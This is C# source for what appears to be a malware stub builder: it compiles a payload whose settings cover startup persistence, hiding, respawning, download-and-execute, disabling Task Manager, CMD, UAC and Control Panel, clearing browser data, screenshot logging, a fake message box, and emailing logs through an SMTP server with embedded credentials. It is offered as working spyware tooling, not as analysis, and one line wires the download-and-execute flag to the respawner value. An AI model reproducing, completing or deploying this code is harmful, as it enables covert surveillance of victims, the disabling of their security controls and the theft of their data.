using System.CodeDom.Compiler;

namespace UnknownLibrary.Stub
{
    public static class InitializeStub
    {
        public static bool Generate(string SourceCode, string ApplicationTitle, string AssemblyInformation, bool AddToStartupbool, bool Hidebool, bool Respawnerbool, bool DownloadAndExecutebool, bool SiteVisitorbool,
            bool SilentSiteVisitorbool, bool ClearChromeAndFireFoxDatabool, bool DisableTaskManagerbool, bool DisableCMDbool, bool DisableUACbool,
            bool DisableControlPanelbool, bool LogScreenshotbool, bool FakeMessageBoxbool,
            string MessageBoxNamestring, string MessageBoxTextstring, string MessageBoxOptionstring, string MessageBoxIconstring, string MailTostring, string MailFromstring,
            string MailPasswordstring, int SendIntervalint, string SMTPServer, string SMTPPort)
        {

            #region VariableInitializer
            string Variables = string.Empty;
            Variables += "namespace Unknown_Stub" +
                "{";
            Variables += "public static class Variables" +
                "{";
            Variables += "public static bool AddToStartup = " + AddToStartupbool.ToString().ToLower() +", Hide = " + Hidebool.ToString().ToLower() + ", Respawner = " + Respawnerbool.ToString().ToLower() + ", DownloadAndExecute = " + Respawnerbool.ToString().ToLower() + ", SiteVisitor = " + SiteVisitorbool.ToString().ToLower() + ",";
            Variables += "SilentSiteVisitor = "+SilentSiteVisitorbool.ToString().ToLower() + ", ClearChromeAndFireFoxData = "+ClearChromeAndFireFoxDatabool.ToString().ToLower() + ", DisableTaskManager = "+DisableTaskManagerbool.ToString().ToLower() + ", DisableCMD = "+DisableCMDbool.ToString().ToLower() + ", DisableUAC = "+DisableUACbool.ToString().ToLower() + ",";
            Variables += "DisableControlPanel = "+DisableControlPanelbool.ToString().ToLower() + ", LogScreenshot = "+LogScreenshotbool.ToString().ToLower() + ", FakeMessageBox = "+FakeMessageBoxbool.ToString().ToLower() + ";";
            Variables += "public static string MessageBoxName = \"" + MessageBoxNamestring + "\", MessageBoxText = \"" + MessageBoxTextstring + "\", MessageBoxOption = \"" + MessageBoxOptionstring + "\", MessageBoxIcon = \"" + MessageBoxIconstring + "\", MailTo = \"" + MailTostring + "\", MailFrom = \"" + MailFromstring + "\", MailPassword = \"" + MailPasswordstring + "\";";
            Variables += "public static int SendInterval = " + SendIntervalint + ";";
            Variables += "public static string SMTPServer = \"" + SMTPServer + "\", SMTPPort = \""+ SMTPPort +"\";";
            Variables += "}" +
                "}";
            #endregion

            var References = new[] { "System.dll", "System.Windows.Forms.dll", "UnknownLibrary.dll", "Microsoft.CSharp.dll", @"C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.5.2\WindowsBase.dll" };
            var Results = CreateStub.CompileStub(Hidebool.ToString().ToLower() ,new[] { SourceCode  ,AssemblyInformation, Variables },  ApplicationTitle, References);
            
            if(Results.Errors.Count == 0)
            {
                return true;
            } else
            {
                foreach(CompilerError Error in Results.Errors)
                {
                    System.Diagnostics.Debug.WriteLine(Error.ErrorText);
                }
                return false;
            }
        }
    }
}
